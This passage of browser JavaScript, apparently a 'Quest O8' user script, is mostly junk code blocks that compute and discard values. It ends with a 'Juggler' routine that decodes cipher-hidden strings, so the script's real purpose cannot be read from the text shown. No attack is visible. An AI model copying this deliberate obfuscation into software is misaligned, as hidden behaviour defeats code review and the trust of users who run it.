        _0xde3f30.r = (_0xde3f30.r + i * 31) & 0xffff;
      }
      const _0xecfe43 = _0xde3f30.p ^ _0xde3f30.q ^ _0xde3f30.r;
      const _0xb29233 = Array.from({ length: (_0xecfe43 & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0x571081 = _0xb29233.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0x571081 > 0x7ffff) { _0xb29233 = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x34c92c = [18868,19055,43247,29932,32251];
      const _0x97fda4 = {};
      for (let i = 0; i < _0x34c92c.length; i++) { const w = _0x34c92c[i]; _0x97fda4[w] = (w.length * 2654435761) >>> 0; }
      let _0x3c3c75 = 0;
      for (const x in _0x97fda4) { _0x3c3c75 = (_0x3c3c75 + _0x97fda4[x]) & 0xffffffff; }
      const _0xad5388 = [_0x3c3c75, _0x34c92c.length];
      const _0x9f513d = _0x34c92c.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0xad5388[0] < 0 || _0x9f513d === 0) { _0xad5388[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x024543 = [32670,25316,64428,58149,936];
      const _0x0b4101 = {};
      for (let i = 0; i < _0x024543.length; i++) { const w = _0x024543[i]; _0x0b4101[w] = (w.length * 2654435761) >>> 0; }
      let _0xc64921 = 0;
      for (const x in _0x0b4101) { _0xc64921 = (_0xc64921 + _0x0b4101[x]) & 0xffffffff; }
      const _0x7f8c52 = [_0xc64921, _0x024543.length];
      const _0x1cfe1b = _0x024543.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0x7f8c52[0] < 0 || _0x1cfe1b === 0) { _0x7f8c52[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x2c4040 = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0x883d14 = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0xfb9df7 = (Date.now() & 0xffff) ^ 0x44b8;
      const _0x33972d = _0x2c4040(_0xfb9df7);
      let _0x808b32 = _0x33972d;
      for (let i = 0; i < 6; i++) { try { _0x808b32 = _0x883d14(_0x808b32, i * 2654435761); } catch (e) { break; } }
      const _0x1a5f24 = [_0xfb9df7, _0x33972d, _0x808b32];
      if (_0x1a5f24.length > 2 && (_0x808b32 & 7) === 0) { _0x1a5f24.length = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x536872 = { p: 0, q: 0, r: 0 };
      const _0xc51478 = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0x536872.p = (_0x536872.p + _0xc51478[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0x536872.q = (_0x536872.q ^ _0x536872.p) & 0xffff; }
        _0x536872.r = (_0x536872.r + i * 31) & 0xffff;
      }
      const _0xa7715c = _0x536872.p ^ _0x536872.q ^ _0x536872.r;
      const _0x2865bb = Array.from({ length: (_0xa7715c & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0xe554d9 = _0x2865bb.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0xe554d9 > 0x7ffff) { _0x2865bb = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0xd508d2 = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0xfbdc47 = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0xaf30d6 = (Date.now() & 0xffff) ^ 0x35ce;
      const _0x9f4ee1 = _0xd508d2(_0xaf30d6);
      let _0xb700d0 = _0x9f4ee1;
      for (let i = 0; i < 6; i++) { try { _0xb700d0 = _0xfbdc47(_0xb700d0, i * 2654435761); } catch (e) { break; } }
      const _0xb6911e = [_0xaf30d6, _0x9f4ee1, _0xb700d0];
      if (_0xb6911e.length > 2 && (_0xb700d0 & 7) === 0) { _0xb6911e.length = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0xb8fa7b = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0x130f5e = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0x5082cc = (Date.now() & 0xffff) ^ 0x58b3;
      const _0x0cd90a = _0xb8fa7b(_0x5082cc);
      let _0xf3313b = _0x0cd90a;
      for (let i = 0; i < 6; i++) { try { _0xf3313b = _0x130f5e(_0xf3313b, i * 2654435761); } catch (e) { break; } }
      const _0x8c64d6 = [_0x5082cc, _0x0cd90a, _0xf3313b];
      if (_0x8c64d6.length > 2 && (_0xf3313b & 7) === 0) { _0x8c64d6.length = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x073569 = [11612,5028,29569,19583,28250];
      const _0xc9a39a = {};
      for (let i = 0; i < _0x073569.length; i++) { const w = _0x073569[i]; _0xc9a39a[w] = (w.length * 2654435761) >>> 0; }
      let _0x92b8c6 = 0;
      for (const x in _0xc9a39a) { _0x92b8c6 = (_0x92b8c6 + _0xc9a39a[x]) & 0xffffffff; }
      const _0xbb9265 = [_0x92b8c6, _0x073569.length];
      const _0x0c581f = _0x073569.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0xbb9265[0] < 0 || _0x0c581f === 0) { _0xbb9265[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x383a01 = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0xf8cd71 = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0xf18ec1 = (Date.now() & 0xffff) ^ 0xde43;
      const _0x6f7d28 = _0x383a01(_0xf18ec1);
      let _0x6c96cb = _0x6f7d28;
      for (let i = 0; i < 6; i++) { try { _0x6c96cb = _0xf8cd71(_0x6c96cb, i * 2654435761); } catch (e) { break; } }
      const _0xbe23b1 = [_0xf18ec1, _0x6f7d28, _0x6c96cb];
      if (_0xbe23b1.length > 2 && (_0x6c96cb & 7) === 0) { _0xbe23b1.length = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0xc82e79 = [54485,20941,58457,34121,33521];
      const _0x7ee609 = {};
      for (let i = 0; i < _0xc82e79.length; i++) { const w = _0xc82e79[i]; _0x7ee609[w] = (w.length * 2654435761) >>> 0; }
      let _0xd5d279 = 0;
      for (const x in _0x7ee609) { _0xd5d279 = (_0xd5d279 + _0x7ee609[x]) & 0xffffffff; }
      const _0x29b1d2 = [_0xd5d279, _0xc82e79.length];
      const _0xd5fd14 = _0xc82e79.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0x29b1d2[0] < 0 || _0xd5fd14 === 0) { _0x29b1d2[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x517d6a = { p: 0, q: 0, r: 0 };
      const _0x3b53b2 = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0x517d6a.p = (_0x517d6a.p + _0x3b53b2[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0x517d6a.q = (_0x517d6a.q ^ _0x517d6a.p) & 0xffff; }
        _0x517d6a.r = (_0x517d6a.r + i * 31) & 0xffff;
      }
      const _0xf7b6e9 = _0x517d6a.p ^ _0x517d6a.q ^ _0x517d6a.r;
      const _0xc18461 = Array.from({ length: (_0xf7b6e9 & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0xaac742 = _0xc18461.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0xaac742 > 0x7ffff) { _0xc18461 = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x55950f = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0x63ce54 = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0x6de37d = (Date.now() & 0xffff) ^ 0xb5f0;
      const _0xee1437 = _0x55950f(_0x6de37d);
      let _0x7918ac = _0xee1437;
      for (let i = 0; i < 6; i++) { try { _0x7918ac = _0x63ce54(_0x7918ac, i * 2654435761); } catch (e) { break; } }
      const _0xd9b364 = [_0x6de37d, _0xee1437, _0x7918ac];
      if (_0xd9b364.length > 2 && (_0x7918ac & 7) === 0) { _0xd9b364.length = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0xa81ce5 = { p: 0, q: 0, r: 0 };
      const _0xb6bd72 = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0xa81ce5.p = (_0xa81ce5.p + _0xb6bd72[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0xa81ce5.q = (_0xa81ce5.q ^ _0xa81ce5.p) & 0xffff; }
        _0xa81ce5.r = (_0xa81ce5.r + i * 31) & 0xffff;
      }
      const _0x6c87be = _0xa81ce5.p ^ _0xa81ce5.q ^ _0xa81ce5.r;
      const _0x404671 = Array.from({ length: (_0x6c87be & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0xd4f64f = _0x404671.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0xd4f64f > 0x7ffff) { _0x404671 = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x6236e5 = [279,52169,61888,61549,48229];
      const _0xe29010 = {};
      for (let i = 0; i < _0x6236e5.length; i++) { const w = _0x6236e5[i]; _0xe29010[w] = (w.length * 2654435761) >>> 0; }
      let _0x58ffe5 = 0;
      for (const x in _0xe29010) { _0x58ffe5 = (_0x58ffe5 + _0xe29010[x]) & 0xffffffff; }
      const _0x2d0a9f = [_0x58ffe5, _0x6236e5.length];
      const _0xae8d00 = _0x6236e5.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0x2d0a9f[0] < 0 || _0xae8d00 === 0) { _0x2d0a9f[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0xe3f9dd = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0x62ece7 = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0xe27dbe = (Date.now() & 0xffff) ^ 0xc331;
      const _0x856288 = _0xe3f9dd(_0xe27dbe);
      let _0xa4c1fd = _0x856288;
      for (let i = 0; i < 6; i++) { try { _0xa4c1fd = _0x62ece7(_0xa4c1fd, i * 2654435761); } catch (e) { break; } }
      const _0x8d2d31 = [_0xe27dbe, _0x856288, _0xa4c1fd];
      if (_0x8d2d31.length > 2 && (_0xa4c1fd & 7) === 0) { _0x8d2d31.length = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x42fb40 = [56112,63370,21567,34246,19456];
      const _0xd31949 = {};
      for (let i = 0; i < _0x42fb40.length; i++) { const w = _0x42fb40[i]; _0xd31949[w] = (w.length * 2654435761) >>> 0; }
      let _0x3b5dc0 = 0;
      for (const x in _0xd31949) { _0x3b5dc0 = (_0x3b5dc0 + _0xd31949[x]) & 0xffffffff; }
      const _0xa14ae2 = [_0x3b5dc0, _0x42fb40.length];
      const _0x0f207d = _0x42fb40.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0xa14ae2[0] < 0 || _0x0f207d === 0) { _0xa14ae2[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x1b00d7 = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0xd20e82 = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0x509998 = (Date.now() & 0xffff) ^ 0x8d41;
      const _0x1874a5 = _0x1b00d7(_0x509998);
      let _0x8478db = _0x1874a5;
      for (let i = 0; i < 6; i++) { try { _0x8478db = _0xd20e82(_0x8478db, i * 2654435761); } catch (e) { break; } }
      const _0xf14fae = [_0x509998, _0x1874a5, _0x8478db];
      if (_0xf14fae.length > 2 && (_0x8478db & 7) === 0) { _0xf14fae.length = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0xa3f9b2 = { p: 0, q: 0, r: 0 };
      const _0x95aeda = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0xa3f9b2.p = (_0xa3f9b2.p + _0x95aeda[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0xa3f9b2.q = (_0xa3f9b2.q ^ _0xa3f9b2.p) & 0xffff; }
        _0xa3f9b2.r = (_0xa3f9b2.r + i * 31) & 0xffff;
      }
      const _0x97187f = _0xa3f9b2.p ^ _0xa3f9b2.q ^ _0xa3f9b2.r;
      const _0x5cf3ad = Array.from({ length: (_0x97187f & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0x7b546b = _0x5cf3ad.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0x7b546b > 0x7ffff) { _0x5cf3ad = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x3ba3e3 = { p: 0, q: 0, r: 0 };
      const _0x4379d5 = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0x3ba3e3.p = (_0x3ba3e3.p + _0x4379d5[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0x3ba3e3.q = (_0x3ba3e3.q ^ _0x3ba3e3.p) & 0xffff; }
        _0x3ba3e3.r = (_0x3ba3e3.r + i * 31) & 0xffff;
      }
      const _0x6a3377 = _0x3ba3e3.p ^ _0x3ba3e3.q ^ _0x3ba3e3.r;
      const _0x11d224 = Array.from({ length: (_0x6a3377 & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0x6ef988 = _0x11d224.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0x6ef988 > 0x7ffff) { _0x11d224 = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x731a8e = [62766,7750,62297,9193,50857];
      const _0xe5e8c5 = {};
      for (let i = 0; i < _0x731a8e.length; i++) { const w = _0x731a8e[i]; _0xe5e8c5[w] = (w.length * 2654435761) >>> 0; }
      let _0x55d7bc = 0;
      for (const x in _0xe5e8c5) { _0x55d7bc = (_0x55d7bc + _0xe5e8c5[x]) & 0xffffffff; }
      const _0x540519 = [_0x55d7bc, _0x731a8e.length];
      const _0x270fe5 = _0x731a8e.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0x540519[0] < 0 || _0x270fe5 === 0) { _0x540519[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x169ecc = { p: 0, q: 0, r: 0 };
      const _0x9e87ce = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0x169ecc.p = (_0x169ecc.p + _0x9e87ce[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0x169ecc.q = (_0x169ecc.q ^ _0x169ecc.p) & 0xffff; }
        _0x169ecc.r = (_0x169ecc.r + i * 31) & 0xffff;
      }
      const _0x4c00f0 = _0x169ecc.p ^ _0x169ecc.q ^ _0x169ecc.r;
      const _0x8b26b8 = Array.from({ length: (_0x4c00f0 & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0x8f55cc = _0x8b26b8.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0x8f55cc > 0x7ffff) { _0x8b26b8 = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x122023 = { p: 0, q: 0, r: 0 };
      const _0x127bc1 = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0x122023.p = (_0x122023.p + _0x127bc1[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0x122023.q = (_0x122023.q ^ _0x122023.p) & 0xffff; }
        _0x122023.r = (_0x122023.r + i * 31) & 0xffff;
      }
      const _0x61b1d4 = _0x122023.p ^ _0x122023.q ^ _0x122023.r;
      const _0x089305 = Array.from({ length: (_0x61b1d4 & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0x5c6be7 = _0x089305.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0x5c6be7 > 0x7ffff) { _0x089305 = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

  })(_0xmod);

  (function (_0xmod) {
    const Log = _0xmod.log;
    const MemberCount = _0xmod.mc;
    const _0xlex = _0xmod.lex;

    (() => {
      const _0xf407fe = { p: 0, q: 0, r: 0 };
      const _0x5eb7a7 = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0xf407fe.p = (_0xf407fe.p + _0x5eb7a7[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0xf407fe.q = (_0xf407fe.q ^ _0xf407fe.p) & 0xffff; }
        _0xf407fe.r = (_0xf407fe.r + i * 31) & 0xffff;
      }
      const _0x8ae2bc = _0xf407fe.p ^ _0xf407fe.q ^ _0xf407fe.r;
      const _0xd55f5b = Array.from({ length: (_0x8ae2bc & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0x9824f3 = _0xd55f5b.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0x9824f3 > 0x7ffff) { _0xd55f5b = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x99daf1 = { p: 0, q: 0, r: 0 };
      const _0x15bb8a = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0x99daf1.p = (_0x99daf1.p + _0x15bb8a[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0x99daf1.q = (_0x99daf1.q ^ _0x99daf1.p) & 0xffff; }
        _0x99daf1.r = (_0x99daf1.r + i * 31) & 0xffff;
      }
      const _0x8ae31e = _0x99daf1.p ^ _0x99daf1.q ^ _0x99daf1.r;
      const _0xad3e75 = Array.from({ length: (_0x8ae31e & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0xb931a9 = _0xad3e75.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0xb931a9 > 0x7ffff) { _0xad3e75 = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0xf1c0dd = [9303,36130,55390,47740,57051];
      const _0xddc187 = {};
      for (let i = 0; i < _0xf1c0dd.length; i++) { const w = _0xf1c0dd[i]; _0xddc187[w] = (w.length * 2654435761) >>> 0; }
      let _0xa3f145 = 0;
      for (const x in _0xddc187) { _0xa3f145 = (_0xa3f145 + _0xddc187[x]) & 0xffffffff; }
      const _0x38a11f = [_0xa3f145, _0xf1c0dd.length];
      const _0xf399a7 = _0xf1c0dd.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0x38a11f[0] < 0 || _0xf399a7 === 0) { _0x38a11f[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x461ee7 = [26394,16377,51130,34871,61620];
      const _0x82dc83 = {};
      for (let i = 0; i < _0x461ee7.length; i++) { const w = _0x461ee7[i]; _0x82dc83[w] = (w.length * 2654435761) >>> 0; }
      let _0x43493a = 0;
      for (const x in _0x82dc83) { _0x43493a = (_0x43493a + _0x82dc83[x]) & 0xffffffff; }
      const _0xe1e1ef = [_0x43493a, _0x461ee7.length];
      const _0x01a2d4 = _0x461ee7.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0xe1e1ef[0] < 0 || _0x01a2d4 === 0) { _0xe1e1ef[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0xa6e014 = { p: 0, q: 0, r: 0 };
      const _0xedb606 = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0xa6e014.p = (_0xa6e014.p + _0xedb606[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0xa6e014.q = (_0xa6e014.q ^ _0xa6e014.p) & 0xffff; }
        _0xa6e014.r = (_0xa6e014.r + i * 31) & 0xffff;
      }
      const _0x2b8b5b = _0xa6e014.p ^ _0xa6e014.q ^ _0xa6e014.r;
      const _0xebd5c0 = Array.from({ length: (_0x2b8b5b & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0x7eeffa = _0xebd5c0.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0x7eeffa > 0x7ffff) { _0xebd5c0 = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

  const _0xrunKey = Symbol.for("quest-suite:o8:active");
  if (window[_0xrunKey]) {
    Log.warn("[Quest O8] An O.8 run is already active; no second run was started.");
    return;
  }
  
  const controller = new AbortController();
  const signal = controller.signal;
  const disposables = [];
  const _0x8844 = new Set();
  
  const _0xe8a7 = (fn) => {
    disposables.push(fn);
    return () => {
      const i = disposables.indexOf(fn);
      if (i > -1) disposables.splice(i, 1);
    };
  };

  const _0xrunOwner = { released: false };
  window[_0xrunKey] = _0xrunOwner;
  
  const GoogleRelease = () => {
    if (_0xrunOwner.released) return;
    _0xrunOwner.released = true;
    const toDispose = disposables.splice(0, disposables.length);
    try { controller.abort(); } catch (e) {}
    while (toDispose.length) { try { toDispose.pop()(); } catch (e) {} }
    while (disposables.length) { try { disposables.pop()(); } catch (e) {} }
    try { if (window[_0xrunKey] === _0xrunOwner) delete window[_0xrunKey]; } catch (e) {}
  };

  let _0xwatch = null, _0xchord = null;
  const GoogleScuttle = () => {
    try { if (_0xwatch !== null) { clearInterval(_0xwatch); _0xwatch = null; } } catch (e) {}
    try { if (_0xchord !== null) { document.removeEventListener("keydown", _0xchord, true); _0xchord = null; } } catch (e) {}
  };
  _0xe8a7(GoogleScuttle);

  (async () => {
    try {
      
      const _0xJRe = [97,45,122,65,45,90,48,45,57,95,47,46,61,63,45];
      const _0xJuggleRE = new RegExp("^[" + String.fromCharCode(..._0xJRe) + "]{3,50}$");
      const _0xT = [12,253,255,47,109,97,143,244,203,53,201,232,230,45,68,227,166,145,21,146,186,207,226,89,63,160,150,240,175,162,216,125,3,14,104,96,222,31,64,213,19,58,121,208,248,250,57,113,9,18,81,200,190,32,49,1,233,117,136,8,82,149,124,13,119,236,23,80,111,217,2,6,152,118,107,106,156,251,101,85,184,176,78,242,103,79,231,93,164,151,86,87,4,254,140,127,196,11,27,91,155,161,65,29,191,0,98,153,128,158,46,135,48,7,95,16,215,177,69,237,61,148,84,108,52,218,76,252,50,228,37,70,225,77,188,241,187,210,22,174,100,204,20,105,59,44,41,55,17,36,245,238,112,171,183,34,206,234,56,110,144,130,198,35,159,170,120,102,139,116,219,134,157,51,195,205,10,137,147,179,42,75,24,172,249,138,154,141,131,173,211,178,114,99,67,54,220,74,223,25,26,224,163,115,60,83,33,72,142,94,122,132,62,133,194,129,214,185,165,246,168,40,169,182,235,209,197,189,43,126,199,30,180,243,212,167,39,192,5,88,90,202,247,92,38,15,181,66,239,229,193,221,71,28,73,123];
      const _0xTi = (() => { const _0xr = new Uint8Array(256); for (let _0xi = 0; _0xi < 256; _0xi++) { _0xr[_0xT[_0xi]] = _0xi; } return _0xr; })();
      const _0xM = [
        function(_0xa, _0xP) { let _0xs = ""; const _0xk = _0xP[0]; for (let _0xi = 0; _0xi < _0xa.length; _0xi++) _0xs += String.fromCharCode(_0xa[_0xi] ^ _0xk); return _0xs; },
        function(_0xa) { let _0xs = ""; for (let _0xi = 0; _0xi < _0xa.length; _0xi++) _0xs += String.fromCharCode(_0xTi[_0xa[_0xi]]); return _0xs; },
        function(_0xa, _0xP) { let _0xs = ""; const _0xk = _0xP[0]; for (let _0xi = 0; _0xi < _0xa.length; _0xi++) _0xs += String.fromCharCode((_0xa[_0xi] - _0xk) & 255); return _0xs; },
        function(_0xa, _0xP) { let _0xs = ""; const _0xr = _0xP[0], _0xk = _0xP[1]; for (let _0xi = 0; _0xi < _0xa.length; _0xi++) { const _0xy = _0xa[_0xi] ^ _0xk; _0xs += String.fromCharCode(((_0xy >>> _0xr) | (_0xy << (8 - _0xr))) & 255); } return _0xs; }
      ];
      const _0xNp = [1,0,1,2];
      const _0xPool = [124,118,111,105,114,77,123,115,110,75,111,127,111,127,67,75,15,155,11,75,19,15,43,11,139,59,3,59,91,59,139,211,131,91,227,139,171,51,3,179,139,171,3,91,59,11,187,187,139,59,59,237,161,27,48,11,91,153,80,191,177,46,153,155,0,16,91,135,95,155,127,11,48,48,41,43,58,248,136,188,220,196,188,180,232,156,224,156,232,220,39,40,38,25,21,33,51,35,34,51,24,25,39,31,40,35,36,17,60,38,54,58,39,49,27,52,33,60,35,48,147,145,128,179,149,153,145,178,155,134,164,189,176,5,229,141,77,125,253,245,125,165,173,29,221,37,253,5];
      const _0xJuggleStats = { total: 0, methods: {}, sanityWarnings: 0, poolBytes: _0xPool.length };
      const _0xJuggle = (_0xs, _0xl) => {
        const _0xf = _0xs[0];
        const _0xn = _0xNp[_0xf];
        let _0xP, _0xb;
        if (_0xs[1] === -11) { _0xP = _0xs.slice(4, 4 + _0xn); _0xb = _0xPool.slice(_0xs[2], _0xs[2] + _0xs[3]); }
        else { _0xP = _0xs.slice(1, 1 + _0xn); _0xb = _0xs.slice(1 + _0xn); }
        const _0xd = _0xM[_0xf](_0xb, _0xP);
        const _0ok = _0xJuggleRE.test(_0xd);
        _0xJuggleStats.total++;
        _0xJuggleStats.methods[_0xf] = (_0xJuggleStats.methods[_0xf] || 0) + 1;
        Log.diag("Juggler decode", { name: _0xl, method: _0xf, len: _0xd.length, valid: _0ok });
        if (!_0ok) { _0xJuggleStats.sanityWarnings++; Log.warn(`[Juggler] ${_0xl}: decoded string failed sanity check (len=${_0xd.length}) - corrupted instance?`); }
        return _0xd;
      };
      let _0xq0 = _0xJuggle([1,-11,51,23], "_0xq0");
      let _0xq1 = _0xJuggle([0,-11,107,13,85], "_0xq1");
      let _0xq2 = _0xJuggle([2,180,227,37,41,25,39,40,39,227], "_0xq2");
      let _0xq3 = _0xJuggle([2,70,117,188,175,170,171,181,115,182,184,181,173,184,171,185,185], "_0xq3");
      let _0xq4 = _0xJuggle([1,113,191,161,11,95,215,27,161,11,215], "_0xq4");
      let _0xq5 = _0xJuggle([2,187,234,28,43,43,39,36,30,28,47,36,42,41,46,234,43,48,29,39,36,30,250,28,43,43,39,36,30,28,47,36,42,41,26,36,31,46,248], "_0xq5");
      let _0xt0 = _0xJuggle([3,1,223,113,93,119,89,79,97,115,77,87,85,65], "_0xt0");
      let _0xt1 = _0xJuggle([3,-11,133,15,3,135], "_0xt1");
      let _0xt2 = _0xJuggle([2,-11,90,17,212], "_0xt2");
      let _0xt3 = _0xJuggle([3,-11,77,13,2,185], "_0xt3");
      let _0xt4 = _0xJuggle([3,5,208,58,248,90,184,217,59,26,249,88,120,57,59,57,25,59,121,57,152,249,89,120], "_0xt4");
      let _0xe0 = _0xJuggle([1,78,79,101,101,118,101,6,127,6,236,251,217,242,127,80,152,236,101,6,217], "_0xe0");
      let _0xe1 = _0xJuggle([3,-11,22,29,3,161], "_0xe1");
      let _0xm0 = _0xJuggle([2,85,188,186,201,168,201,199,186,182,194,186,199,150,184,201,190,203,186,168,201,199,186,182,194,162,186,201,182,185,182,201,182], "_0xm0");
      let _0xm1 = _0xJuggle([1,29,161,215,78,177,46,46,0,46,29,6,11,158,161,16], "_0xm1");
      let _0xm2 = _0xJuggle([0,-11,120,13,244], "_0xm2");
      let _0xm3 = _0xJuggle([3,-11,14,8,2,222], "_0xm3");
      let _0xm4 = _0xJuggle([1,29,161,215,236,128,128,103,191,95,161,11,155,16,2,135,95,184,11,95,161,46,215], "_0xm4");
      let _0xm5 = _0xJuggle([3,6,151,78,206,138,67,6,66,134,206,14,207,202,140,138,71,141,207,12,12,206,140], "_0xm5");
      let _0xm6 = _0xJuggle([0,-11,0,14,26], "_0xm6");
      let _0xm7 = _0xJuggle([0,-11,74,3,78], "_0xm7");
      let _0xm8 = _0xJuggle([0,222,185,187,170,141,177,172,170,187,186,142,172,183,168,191,170,187,157,182,191,176,176,187,178,173], "_0xm8");
      let _0xm9 = _0xJuggle([2,163,10,8,23,228,15,15,234,24,12,15,7,22], "_0xm9");
